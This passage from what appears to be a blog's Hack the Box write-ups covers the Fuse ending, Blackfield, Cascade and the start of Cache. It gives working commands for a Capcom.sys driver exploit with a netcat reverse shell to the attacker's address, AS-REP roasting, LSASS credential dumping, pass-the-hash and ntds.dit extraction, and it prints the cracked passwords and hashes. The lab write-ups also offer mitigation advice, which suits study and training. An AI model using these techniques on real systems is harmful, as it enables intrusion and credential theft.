svc-print -p &#39;$fab@s3Rv1ce$1&#39;We’ve successfully gained a foothold, let’s grab the first flag.Root FlagAlright, let’s try to escalate our privileges. Before diving into more intrusive enumeration methods, we’ll run the whoami command to see if we have any special access or privileges that we can abuse.&amp;gt; whoami /allUSER INFORMATION----------------User Name SID=================== ==============================================fabricorp\\svc-print S-1-5-21-2633719317-1471316042-3957863514-1104GROUP INFORMATION-----------------Group Name Type SID Attributes========================================== ================ ============================================== ==================================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Print Operators Alias S-1-5-32-550 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupFABRICORP\\IT_Accounts Group S-1-5-21-2633719317-1471316042-3957863514-1604 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeLoadDriverPrivilege Load and unload device drivers EnabledSeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled.We have a lot of interesting privileges as the svc-print user but one stands out:SeLoadDriverPrivilege Load and unload device drivers EnabledThis article from Tarlogic explains how this privilege can be abused to elevate to Administrator. Essentially, since we can load drivers as this user, we can utilize a custom, malicious toolset to load the capcom.sys driver. Once it’s loaded, we can run another program to gain a reverse SYSTEM shell.Okay, first things first, we’ll grab the two tools from GitHub that we will need to compile ourselves mentioned in the Tarlogic article. The first one will compile into an executable called LOADDRIVER.exe. This program should suffice as is. We’ll use Visual Studios 2019 to edit and compile our projects.Once that’s compiled, we’ll move to the executable ExploitCapcom.exe. We’ll need to make a change to the LaunchShell() function to run our desired command in a privileged context. We’ll create a simple batch file (C:\\temp\\nc.exe 10.10.14.251 4444 -e cmd.exe) that will run a netcat command to open a reverse shell. We’ll add the command to execute the batch file at line 292. Once that’s done we’ll compile it.Okay, we’ve got our files. Let’s upload them to a temp directory on the victim machine with evil-winrm. We’ll have to upload a netcat executable as well so that our batch file works.On our Kali box, we’ll start a netcat listener in preparation to capture a callback.nc -lvnp 4444Now, let’s start performing the exploit. We’ll run the LOADDRIVER.exe to prepare the driver.&amp;gt; .\\LOADDRIVER.exe System\\CurrentControlSet\\MyService C:\\temp\\Capcom.sys[+] Enabling SeLoadDriverPrivilege[+] SeLoadDriverPrivilege Enabled[+] Loading Driver: \\Registry\\User\\S-1-5-21-2633719317-1471316042-3957863514-1104\\System\\CurrentControlSet\\MyServiceNTSTATUS: 00000000, WinError: 0And then we’ll run the ExploitCapcom executable.&amp;gt; .\\ExploitCapcom.exe[*] Capcom.sys exploit[*] Capcom.sys handle was obtained as 0000000000000064[*] Shellcode was placed at 0000023E932F0008[+] Shellcode was executed[+] Token stealing was successful[+] The SYSTEM shell was launched[*] Press any key to exit this programBack on our Kali machine, we receive a reverse shell. Success! Let’s grab the root flag.Mitigation Documents shouldn’t be named after a domain password. Especially if this password is currently being used, albeit expired. Audit the domain and its exposed information often. An active password in the description of an account is bad practice and is pretty readily exposed with a couple steps. This needs to be considered even more when that account has privileges that can be abused to achieve privilege escalation. Final ThoughtsUnique box, the path to SYSTEM was very print-centric and I learned a lot about configuration and usage of print services within a domain. I didn’t enjoy finding the password as a filename, as that took entirely too long and was easy to miss. Overall, though, I learned a few neat tricks that feel realistic enough to save for later. Additionally, I took some time to look through the exploit source code, since it’s so readily available, and learned some interesting things about how this service abuse works, I’d recommend doing the same." }, { "title": "Hack the Box - Blackfield", "url": "/posts/HTB-Blackfield/", "categories": "Hack the Box, Windows", "tags": "windows, ctf, htb", "date": "2020-07-08 13:00:00 -0500", "snippet": "This is my guide to the HackTheBox Windows machine Blackfield. This is my first Hard difficulty box that I’ve rooted. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration Openly available sharesExploitation Kerberoasting - harvest non-preauth responsesPriv Esc LSASS dump Group policy abuse User FlagFirst, let’s use nmap to scan Blackfield. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Tue Jul 7 13:43:23 2020 as: nmap -sC -sV -O -oA scan192 10.10.10.192Nmap scan report for 10.10.10.192Host is up (0.12s latency).Not shown: 993 filtered portsPORT STATE SERVICE VERSION53/tcp open domain?| fingerprint-strings:| DNSVersionBindReqTCP:| version|_ bind88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-07-08 01:48:18Z)135/tcp open msrpc Microsoft Windows RPC389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.03268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.80%I=7%D=7/7%Time=5F04C269%P=x86_64-pc-linux-gnu%r(DNSVeSF:rsionBindReqTCP,20,&quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\xSF:04bind\\0\\0\\x10\\0\\x03&quot;);Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portOS fingerprint not ideal because: Missing a closed TCP port so results incompleteNo OS matches for hostService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 7h04m28s| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2020-07-08T01:50:49|_ start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Jul 7 13:46:58 2020 -- 1 IP address (1 host up) scanned in 215.40 secondsOkay, our results are back and it looks like this box is a domain controller, most of the open ports are typically what we should see on a DC.$ sudo nmap -sC -sV -O -p- -oA full180 10.10.10.1925985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)A full port scan also reveals that port 5985 is open, which allows remote credentialed access with WinRM 2.0 (Microsoft Windows Remote Management). Next, let’s try to enumerate some of the available services for more information.$ enum4linux 10.10.10.192enum4linux, a tool to enumerate Windows or Samba systems, yields little. Let’s see if any shares are viewable without credentials.Success. Trying each one, it looks like we can access the profiles$ share.$ smbclient \\\\\\\\10.10.10.192\\\\profiles$This reveals a lot of user directories, none of which are accessible. This does, however, give us some credentials to start enumerating. We can use a tool from Impacket which will check to see if any users have the property “Do not require Kerberos preauthentication” set (UF_DONT_REQUIRE_PREAUTH). If this is the case, we will receive a hash.This is a subset of a process called “kerberoasting”, which is described in more detail in this article. Let’s grab all the usernames and save them into a list.$ GetNPUsers.py -dc-ip 10.10.10.192 BLACKFIELD.LOCAL/ -usersfile users -format hashcat -outputfile user.hash[...]$krb5asrep$23$support@BLACKFIELD.LOCAL:03fcde2dba3e2be20f5f7671f28a7200$cfc16761e1295b96b10714ee0424df3e1df623d73e606031e5787993565bcbadd2a2228e541aedd208d66e2f185e491306b0aabb9d43b99bc4e86d4370d6fd819f5fa9b11ccd0b07084347f7d854e129b64819de43f9e4ed751e32d339af4dc91d30a4a9fc3d32fa81fff5cb6a0abaf024c0402f47f53f228e280a8867cd609f9abb8b583fe03eade58eb980a56996e6093e04cdd20b0eb82c405d02ec9b18c491e304dce940b5a3460f4c02e4c72cf0250806230bd00c31d4588c2dd985ed5a85794aa3f1413a26c941895dedeefd33164f9f620cd54ccacbe65dfe37c6ec394249d8b2212db977f8026c54e8be9f51e3a13632[...]We receive a hash for the support user. We also can see that the users audit2020 and svc_backup are still active accounts. Lets use john to see if we can crack the hash and receive a password.$ sudo john user.hash --wordlist=rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])Will run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status#00^BlackKnight ($krb5asrep$23$support@BLACKFIELD.LOCAL)1g 0:00:00:38 DONE (2020-07-07 14:54) 0.02623g/s 376048p/s 376048c/s 376048C/s #13Carlyn..#*burberry#*1990Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completedSuccess, we now have some credentials; the password #00^BlackKnight, most likely for the support user.We have no luck trying our newly acquired creds on the various services available, but the user we have access to, support, is indicative of where we may have access. We can perform various helpdesk/support functions with RPC, so let’s see if we can change the password of one of the other accounts we know about, potentially giving us elevated access.We’ll use rpcclient to give this a shot.$ rpcclient -U &quot;support&quot; 10.10.10.192Enter WORKGROUP\\support&#39;s password:rpcclient $&amp;gt;Okay, we have RPC access. This article has excellent information on how to perform a password reset. Let’s give it a shot.rpcclient $&amp;gt; setuserinfo2 audit2020 23 &#39;hello1234!&#39;The account that we can reset the password successfully for is audit2020. Let’s backtrack a little with our new credentials and see what the audit2020 user can access. We’ll try enumerating the various SMB shares that we found earlier.$ smbclient \\\\\\\\10.10.10.192\\\\forensic -U audit2020%hello1234!Try &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt;We can access the forensic share. Let’s see what we can find.&amp;gt; dir . D 0 Sun Feb 23 07:03:16 2020 .. D 0 Sun Feb 23 07:03:16 2020 commands_output D 0 Sun Feb 23 12:14:37 2020 memory_analysis D 0 Thu May 28 15:28:33 2020 tools D 0 Sun Feb 23 07:39:08 2020 7846143 blocks of size 4096. 3986813 blocks availableThe memory_analysis drive has a lsass.zip file. In Windows, the LSASS memory typically stores credentials for users on the machine. Some attacks on Windows environments include dumping LSASS and using a tool like mimikatz to extract passwords. Fortunately for us, it looks like we can just grab this file now. Additionally, since this isn’t a new dump as far as we can tell, we don’t necessarily know if these credentials will still be valid. Let’s see what we can find.&amp;gt; cd memory_analysis&amp;gt; get lsass.zipI’ll use the tool pypykatz, which is like mimikatz but helps with locally extracting credentials. A great guide can be found here on Hackndo.$ pypykatz lsa minidump lsass.DMP[...]username svc_backupdomainname BLACKFIELDlogon_server DC01logon_time 2020-02-23T18:00:03.423728+00:00sid S-1-5-21-4194615774-2175524697-3563712290-1413luid 406458 == MSV == Username: svc_backup Domain: BLACKFIELD LM: NA NT: 9658d1d1dcd9250115e2205d9f48400d SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c[...]We now have a few different accounts and their NTLM hashes. We can attempt a pass-the-hash attack with evil-winrm, which tries remote access utilizing port 5985. Enumerating through our options, we can successfully log in with the svc_backup account.$ evil-winrm -H 9658d1d1dcd9250115e2205d9f48400d -u svc_backup -i 10.10.10.192Let’s grab the user flag.Root FlagNow, on to root. Let’s see what kind of access we have with the svc_backup user.&amp;gt; net user svc_backup /domainUser name svc_backupFull NameCommentUser&#39;s commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 2/23/2020 10:54:48 AMPassword expires NeverPassword changeable 2/24/2020 10:54:48 AMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 2/23/2020 11:03:50 AMLogon hours allowed AllLocal Group Memberships *Backup Operators *Remote Management UseGlobal Group memberships *Domain UsersThe command completed successfully.Looks like we are apart of the Backup Operators local group. A little research reveals that we can abuse this group to elevate our privileges. More information can be found here.First, let’s create a script text file that will contain parameters for the diskshadow command:set context persistent nowriters set metadata c:\\windows\\system32\\spool\\drivers\\color\\example.cab set verbose on begin backup add volume c: alias mydrive create expose %mydrive% w: end backupWe will upload it to the box with evil-winrm and use the diskshadow command.&amp;gt; upload script.txt&amp;gt; diskshadow /s script.txtIn order to emulate the backup software, we need to upload two DLLs found here, import them, and use this to access the shadow copy back up.&amp;gt; upload SeBackupPrivilegeCmdLets.dll&amp;gt; upload SeBackupPrivilegeUtils.dll&amp;gt; Import-Module .\\SeBackupPrivilegeCmdLets.dll&amp;gt; Import-Module .\\SeBackupPrivilegeUtils.dllNext, we’ll grab the ntds.dit database file from the shadow copy, then dump the SYSTEM hive.&amp;gt; Copy-FileSeBackupPrivilege w:\\windows\\NTDS\\ntds.dit c:\\temp\\ntds.dit -Overwrite&amp;gt; reg save HKLM\\SYSTEM c:\\temp\\system.hiveFinally, we will download the two files, the ntds.dit and system.hive files, to our local box, where we can dump credentials.Back on our box, we’ll use the secretsdump.py command from Impacket with the SYSTEM hive and ntds.dit file as the parameters.$ secretsdump.py -system system.hive -ntds ntds.dit LOCAL &amp;gt; secretsdump.txtFrom this, we receive a lot of information, but most importantly, we receive the Administrator NTLM hash. Using the same pass-the-hash attack from earlier, we should be able to remotely access the box again, now as the admin.$ evil-winrm -u Administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.10.10.192Success, let’s grab the final flag.Mitigation This mitigation is similar to the one from my Sauna box write-up. There a few ways to mitigate the risk of kerberoasting; a strong password policy helps alleviate the chance that someone will crack a hash. Additionally, avoid accounts with pre-authentication. If an organization must have that enabled, they need to have very complex passwords, as the hash is readily exposed. It goes without saying, though, that even if the hash can’t be cracked, pass-the-hash attacks can still occur. If something as important as the LSASS memory has been dumped, like in this case, then best practice should be changing the passwords for accounts that were included in the dump, or disabling the accounts. Special considerations should be taken when a file like this is created. A lot of group policies can be abused and an administrator should carefully consider access to accounts with abusable groups. In this case, a user that can take create backups is especially dangerous, as abuse of this can dump credentials on the machine. This can be devastating on a domain controller. Final ThoughtsI really enjoyed this box. It was my first Hard difficulty box and it was definitely tough, but I learned a lot and it was satisfying to complete. I felt it had a lot of realistic aspects, and I really enjoyed the back-and-forth as we found creds and had to backtrack to services we had previously enumerated." }, { "title": "Hack the Box - Cascade", "url": "/posts/HTB-Cascade/", "categories": "Hack the Box, Windows", "tags": "windows, ctf, htb", "date": "2020-07-05 13:00:00 -0500", "snippet": "This is my guide to the HackTheBox Windows machine Cascade. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration enum4linux ldapsearch dump SMB shares Exploitation Weak password policy Reverse engineering files Priv Esc Stored passwords Recovering Active Directory recycling bin objects User FlagWe’ll begin with an nmap scan of the box Cascade. From the results, it looks like this is a domain controller. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Sat Jul 4 17:54:10 2020 as: nmap -sC -sV -O -oA scan182 10.10.10.182Nmap scan report for 10.10.10.182Host is up (0.085s latency).Not shown: 986 filtered portsPORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid:|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-07-04 22:58:54Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds?636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc Microsoft Windows RPC49165/tcp open msrpc Microsoft Windows RPCWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purpose|phone|specializedRunning (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)No exact OS matches for host (test conditions non-ideal).Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:|_clock-skew: 4m23s| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2020-07-04T22:59:51|_ start_date: 2020-07-03T04:16:09OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Jul 4 17:58:04 2020 -- 1 IP address (1 host up) scanned in 234.38 secondsLet’s also run a full port scan as well.$ sudo nmap -sC -sV -O -p- -oA full182 10.10.10.1825985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)The only useful information that this yields is that port 5985 is open, indicating to us that WinRM 2.0 (Microsoft Windows Remote Management) is available. Once we have some credentials, this is an option for a foothold.We’ll go ahead and run enum4linux as well.$ enum4linux 10.10.10.182This reveals a list of users to us. Let’s make note of these users for later.Further enumeration methods don’t seem to yield any more useful results. We still don’t have sufficient information to start reading file shares or gain a foothold. We’ll go ahead and run ldapsearch and dump as much domain controller data that we can.$ ldapsearch -x -b &quot;dc=cascade,dc=local&quot; -H ldap://10.10.10.182 &amp;gt; ldap.txtThis command will dump a ton of information into a text file for us to sift through. A few thousand lines in we find a field named cascadeLegacyPwd with what appears to be a base64 encoded password for the user r.thompson.[...]sAMAccountName: r.thompsonsAMAccountType: 805306368userPrincipalName: r.thompson@cascade.localobjectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=localdSCorePropagationData: 20200126183918.0ZdSCorePropagationData: 20200119174753.0ZdSCorePropagationData: 20200119174719.0ZdSCorePropagationData: 20200119174508.0ZdSCorePropagationData: 16010101000000.0ZlastLogonTimestamp: 132382409952694090msDS-SupportedEncryptionTypes: 0cascadeLegacyPwd: clk0bjVldmE=[...]Decoding this reveals the password rY4n5eva. Let’s see what we can do with this information.First thing we’ll try is smb enumeration with smbclient.$ smbclient -L 10.10.10.182 -U r.thompson%rY4n5evaGood news, we are able to successfully view the shares on the machine. Let’s start enumerating them.The two share that really stand out are the Data and Audit$ shares. Unfortunately, user r.thompson doesn’t have Audit$ access, but do have permissions for the Data share.$ smbclient \\\\\\\\10.10.10.182\\\\Data -U r.thompson%rY4n5evaWithin the IT directory of the Data share, we found a couple of interesting files the first, Meeting_Notes_June_2018 is from the Email Archives subdirectory.&amp;lt;p&amp;gt;For anyone that missed yesterday’s meeting (I’m looking atyou Ben). Main points are below:&amp;lt;/p&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;&amp;lt;o:p&amp;gt;&amp;amp;nbsp;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;-- New production network will be going live onWednesday so keep an eye out for any issues. &amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;-- We will be using a temporary account toperform all tasks related to the network migration and this account will be deleted at the end of2018 once the migration is complete. This will allow us to identify actionsrelated to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). &amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;-- The winner of the “Best GPO” competition will beannounced on Friday so get your submissions in soon.&amp;lt;/p&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;&amp;lt;o:p&amp;gt;&amp;amp;nbsp;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;Steve&amp;lt;/p&amp;gt;We’ll make note of this, it doesn’t appear to have any pertinent information for us right now, but it suggests that a TempAdmin user account was deleted which used the same password as the active Administrator account.Another interesting file is Ark AD Recycle Bin within the Logs subdirectory, which indicates to us that this domain controller uses an AD recycle bin, which may be where we can discover more information about the “deleted” TempAdmin. Let’s make note of that and move on.The last file we find is in the subdirectory of s.smith within the Temp directory. Strangely we have read access and are able to view the VNC Install.reg file.&amp;gt; cd IT&amp;gt; cd Temp&amp;gt; cd s.smith&amp;gt; get &quot;VNC Install.reg&quot;This file contains a password, which VNC encodes.[...]&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f[...]With a little research, we find this tool which decrypts the hex password. Let’s go ahead and download it and run it on the hex string.$ python vncpasswd.py -d 6bcf2a4b6e5aca0f -HDecrypted Bin Pass= &#39;sT333ve2&#39;Decrypted Hex Pass= &#39;7354333333766532&#39;Considering the VNC file was in the directory of user s.smith, we can probably assume that the password sT333ve2 belongs to this user. Let’s add it to our password text file, then attempt to connect to WinRM. We’ll use the tool evil-winrm, a shell tool specialized for hacking and penetration testing.$ evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2Success! Let’s grab the flag off of the user’s desktop.Root FlagEnumerating further doesn’t seem to reveal much but s.smith does have permission to view the Audit$ share. Let’s use smbclient to enumerate this further.smbclient \\\\\\\\10.10.10.182\\\\Audit$ -U s.smith%sT333ve2Okay, so this share contains some very interesting files. It looks like an auditing program that potentially references a DLL and a database containing account information.Let’s go ahead grab all the files and bring them over to our machine to perform some reverse engineering.&amp;gt; get CascAudit.exe&amp;gt; get CascCrypto.dll&amp;gt; cd DB&amp;gt; get Audit.dbThe first thing we’ll do is check the database for anything useful. After poking around a bit, we can see that the password for the user ArkSvc is available, but encrypted.Traditional decoding doesn’t seem to work on this string, so let’s check our other two files to see if we can find something that can help us.We have to do some basic reverse engineering, so let’s use ILSpy, a cross-platform decompiler for .NET applications. This will allow us to view the source code of each file.Within the CascAudit.exe file, we find that the encyption is the Advanced Encyption Standard, or AES, and the encryption mode is Cipher Block Chaining, or CBC. This indicates that we will need a secret key and Initialization Vector, or IV, to decrypt the password. Computerphile has a great video on how AES works.Upon further investigation, we find a method containing the secret key that is used to encrypt or decrypt the password stored in the database.Let’s make note of the secret key: c4scadek3y654321.Next, we’ll decompile the CascCrypto.dll file. Pretty quickly, we find the value for the IV. We can also see the key size is 128.We can use this information to decrypt the password offline, or we can use one of the many online options. Let’s go ahead and plug the pieces into this website for online AES decryption.I’d also like to note that the code can be modified and executed on a Windows machine to reveal the decrypted password as well. It’s good practice to have sandboxes for multiple operating systems available for situations like these.The password for the user ArkSvc is decrypted and we receive w3lc0meFr31nd. Let’s attempt remote login with evil-winrm.$ evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31ndSuccess. With our new foothold, we can try to escalate our privilege.Earlier, we discovered that the box is using Active Directory recycle bin, and we can recall the logs indicate that the user ArkSvc can perform these recycling functions.Additonally, we learned that TempAdmin was “recycled” and had the same password as the Administrator. Poweradmin has a great article on how to restore or view objects that had been deleted using the AD recycle bin.In our WinRM shell, let’s run the following command, which should display the objects that have been deleted.&amp;gt; Get-ADObject -filter &#39;isdeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#39; -includeDeletedObjects -property *[...]CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVzCN : TempAdmin[...]A little ways down, we can see the object TempAdmin and a field cascadeLegacyPwd. We know from earlier that the password is base64 encoded, let’s grab it and decode it.$ echo YmFDVDNyMWFOMDBkbGVz | base64 -dbaCT3r1aN00dlesNow let’s see if the Administrator password hasn’t been changed. We’ll attempt connection with our newly acquired password.$ evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dlesSuccess! Let’s grab the root flag off the Administrator desktop.Mitigation Strong password policies are important and must be enforced. A user should be required to change a legacy password, and if the user account is no longer in use for that not to occur, than account management should result in disabling the account and/or remove privileges. Avoid using the same password across multiple accounts, especially the one used by the Administrator. It may be convenient, but it exposes the account to risk. In this specific scenario with TempAdmin, simply changing the password after the migration or using a password with just one different character may have prevented an attack. An administrator using the AD recycle bin should better monitor the recovery period for a deleted object. This is specified with the msDS-DeletedObjectLifetime attribute. According to the email Meeting_Notes_June_2018, the TempAdmin account was moved to the recycle bin at the end of 2018, meaning it was there for over a year. Understanding that an object and it’s attributes moved to the recycle bin are not actually deleted until after it’s lifetime is up is key. Final ThoughtsThis was probably one of my favorite boxes so far. It had an excellent and realistic combination of enumeration, note-taking, and reverse engineering that was challenging but not frustrating. I learned a lot and will definitely look back on Cascade going forward." }, { "title": "Hack the Box - Cache", "url": "/posts/HTB-Cache/", "categories": "Hack the Box, Linux", "tags": "linux, ctf, htb", "date": "2020-07-04 13:00:00 -0500", "snippet": "This is my guide to the HackTheBox Linux machine Cache. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration Webpage EnumerationExploitation SQL injection Authenticated remote code execution Priv Esc Memcache dump Docker privilege escalation User FlagFirst, let’s scan Cache with nmap. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Fri Jul 3 16:39:51 2020 as: nmap -sC -sV -O -oA scan188 10.10.10.188Nmap scan report for 10.10.10.188Host is up (0.089s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)| 256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)|_ 256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: CacheNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.80%E=4%D=7/3%OT=22%CT=1%CU=34578%PV=Y%DS=2%DC=I%G=Y%TM=5EFFA5C1OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=ASOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%TOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=OS:S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Jul 3 16:40:17 2020 -- 1 IP address (1 host up) scanned in 26.34 secondsOur scan indicates that only port 22 and port 80 are open. Our full port scan does not indicate that anymore ports are open. This tells us that this is most likely a web server.Let’s check out the website.Enumerating this site doesn’t reveal a lot but the author page does indicate that we should add the domain name to our /etc/hosts file so that it resolves correctly.sudo vi /etc/hostsAdditionally, the author mentions another project, the HMS (Hospital Management System), that they’ve worked on. If this site resolves to cache.htb their HMS may resolve with a similar naming scheme. We’ll add hms.htb to our /etc/hosts as well and see if we can successfully navigate to it.The Hospital Management System is available and we can see the patient portal login page. This screen also indicates that this is OpenEMR software, which, after a little research, looks to be vulnerable to a SQL injection attack. Page 8 has a lot of detail on the attack we will use.The vulnerable URL is http://hms.htb/portal/find_appt_popup_user.php?catid=1 and by adding a comment quotation mark to the catid parameter, we can add unsanitized input without authentication. Let’s capture a request to this URL with Burp Suite and save it to a file called portal.req.GET /portal/find_appt_popup_user.php?catid=1 HTTP/1.1Host: hms.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: 